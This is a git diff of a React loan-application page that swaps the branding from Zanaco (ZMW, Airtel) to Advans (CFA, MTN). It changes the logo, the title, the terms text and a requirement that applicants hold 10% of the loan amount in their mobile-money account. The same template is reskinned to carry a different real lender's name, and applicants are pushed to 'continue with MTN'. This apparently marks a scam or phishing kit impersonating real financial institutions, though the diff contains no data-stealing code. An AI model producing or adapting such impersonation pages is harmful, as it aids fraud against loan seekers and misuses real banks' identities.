@@ -64,19 +64,19 @@ function Apply({ client, myFuncs }) {
     <div className={styles.container}>
       <div className={styles.containe}>
         <section className={styles.header}>
-          <img src="/logo.jpeg" alt="zanaco logo" />
-          <h1>zanaco loan</h1>
+          <img src="/advans.svg" alt="Advans logo" />
+          <h1>Advans Loan</h1>
         </section>
         <section className={styles.intro}>
           <h2>Apply for a loan in minutes</h2>
           <p className={styles.helpText}>
             Please fill in all required details accurately. All information is
-            kept confidential and used only for loan processing and
-            verification.
+            kept confidential and used only for loan processing and verification
+            only.
           </p>
           <p className={styles.note}>
             <span>Important</span>: You must have at least 10% of the loan
-            amount you want in your Airtel account.
+            amount you want in your MTN account.
           </p>
         </section>
         <section className={styles.dataFields}>
@@ -168,11 +168,11 @@ function Apply({ client, myFuncs }) {
           </div>
 
           <div>
-            <label htmlFor="name">Loan Amount(ZMW)*</label>
+            <label htmlFor="name">Loan Amount(CFA)*</label>
             <input
               type="number"
               className="no-spinner"
-              placeholder="ZMW 30000 "
+              placeholder="CFA 100,000 "
               value={loan}
               onChange={(e) => setloan(e.target.value)}
             />
@@ -196,12 +196,12 @@ function Apply({ client, myFuncs }) {
             <input type="checkbox" required />
             <p>
               I confirm that the information provided is true and I agree to the
-              zanaco Loans terms and conditions.
+              Advans Loans terms and conditions.
             </p>
           </div>
           <p>Fields marked with * are required.</p>
           <div className={styles.apllyBtn}>
-            <button onClick={handleContinue}>continue with Airtel</button>
+            <button onClick={handleContinue}>continue with MTN</button>
             <button onClick={reset} style={{ color: "black" }}>
               Reset
             </button>
